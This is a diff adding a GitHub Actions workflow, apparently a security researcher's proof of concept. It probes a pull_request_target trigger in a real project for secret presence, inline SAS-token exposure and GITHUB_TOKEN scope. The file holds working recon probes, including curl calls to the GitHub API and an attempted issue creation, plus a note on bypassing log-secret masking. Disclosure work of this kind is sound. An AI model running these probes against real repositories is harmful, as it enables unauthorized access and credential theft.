@@ -1,0 +1,104 @@
+# PoC: pull_request_target recon — mirrors doc_remove.yml trigger
+# The original workflow runs `azcopy rm` with the SAS token inline.
+# This PoC demonstrates what an attacker's closed fork PR accesses.
+
+name: "PoC: PRT Recon (doc_remove trigger)"
+
+permissions:
+  contents: read
+
+on:
+  pull_request_target:
+    types: [closed]
+    branches:
+      - main
+      - 'v*-branch'
+
+jobs:
+  recon:
+    runs-on: ubuntu-24.04
+    steps:
+      # ── 1. Event metadata ──────────────────────────────────────────
+      - name: "[recon] PR close event metadata"
+        run: |
+          echo "=== pull_request_target (closed) event ==="
+          echo "event_name:       ${{ github.event_name }}"
+          echo "action:           ${{ github.event.action }}"
+          echo "merged:           ${{ github.event.pull_request.merged }}"
+          echo "repo:             ${{ github.repository }}"
+          echo "base_ref:         ${{ github.event.pull_request.base.ref }}"
+          echo "head_repo:        ${{ github.event.pull_request.head.repo.full_name }}"
+          echo "pr_number:        ${{ github.event.pull_request.number }}"
+          echo "pr_author:        ${{ github.event.pull_request.user.login }}"
+          echo "is_fork_pr:       ${{ github.event.pull_request.head.repo.full_name != github.repository }}"
+
+      # ── 2. Secret / variable presence ──────────────────────────────
+      # The original doc_remove.yml embeds secrets.NCS_DOC_SAS_PRS and
+      # vars.NCS_DOC_PR_STORAGE_URL directly into the azcopy command line.
+      # If these are populated, the SAS token is in plaintext in the
+      # process tree and shell history of the runner.
+      - name: "[recon] Secret and variable presence for doc_remove"
+        env:
+          S_NCS_DOC_SAS_PRS: ${{ secrets.NCS_DOC_SAS_PRS }}
+          V_NCS_DOC_PR_STORAGE_URL: ${{ vars.NCS_DOC_PR_STORAGE_URL }}
+        run: |
+          echo "=== doc_remove secret/variable check ==="
+          [ -n "$S_NCS_DOC_SAS_PRS" ]      && echo "NCS_DOC_SAS_PRS: PRESENT (len=${#S_NCS_DOC_SAS_PRS})"      || echo "NCS_DOC_SAS_PRS: ABSENT"
+          [ -n "$V_NCS_DOC_PR_STORAGE_URL" ] && echo "NCS_DOC_PR_STORAGE_URL: PRESENT (len=${#V_NCS_DOC_PR_STORAGE_URL})" || echo "NCS_DOC_PR_STORAGE_URL: ABSENT"
+
+      # ── 3. Demonstrate the inline-secret exposure pattern ──────────
+      # The original workflow does:
+      #   azcopy rm "${{ vars.URL }}...?${{ secrets.SAS }}" --recursive=true
+      # This puts the SAS token into argv[1] of the azcopy process.
+      # Any coprocess, /proc read, or ps aux would see it.
+      - name: "[recon] Simulated command-line secret leak"
+        env:
+          AZCOPY_CONCURRENCY_VALUE: 3000
+        run: |
+          echo "=== What the original command does ==="
+          echo 'azcopy rm "${NCS_DOC_PR_STORAGE_URL}addons/addon-sidewalk/PR-${{ github.event.number }}?${NCS_DOC_SAS_PRS}" --recursive=true'
+          echo ""
+          echo "If NCS_DOC_SAS_PRS is populated, the Azure SAS token appears:"
+          echo "  1. In the shell command line (visible via /proc/PID/cmdline)"
+          echo "  2. In the runner's bash history"
+          echo "  3. In GitHub Actions step logs (masked, but the mask is bypassable"
+          echo "     with base64/hex encoding tricks or character-by-character echo)"
+          echo "  4. To any malicious action that runs in the SAME job"
+          echo ""
+          echo "The SAS token grants:"
+          echo "  - Read/Write/Delete to the Azure Blob Storage container"
+          echo "  - PR documentation artifacts for the sdk-sidewalk project"
+
+      # ── 4. GITHUB_TOKEN scope (limited by permissions: contents: read) ─
+      - name: "[recon] GITHUB_TOKEN scope (restricted)"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "=== GITHUB_TOKEN with permissions: contents: read ==="
+          echo "This workflow explicitly limits permissions to contents:read."
+          echo "Probing what the token can still do..."
+          echo ""
+
+          echo "--- read contents ---"
+          curl -s -o /dev/null -w "HTTP %{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/${{ github.repository }}" && echo
+
+          echo "--- list repo secrets (should 403) ---"
+          curl -s -o /dev/null -w "HTTP %{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/secrets" && echo
+
+          echo "--- write issue (should 403) ---"
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d '{"title":"[poc] doc_remove probe","body":"delete me"}' \
+            "https://api.github.com/repos/${{ github.repository }}/issues")
+          echo "create issue: HTTP $STATUS"
+
+          echo "--- read private content (if any) ---"
+          curl -s -o /dev/null -w "HTTP %{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/${{ github.repository }}/contents/.github/workflows" && echo
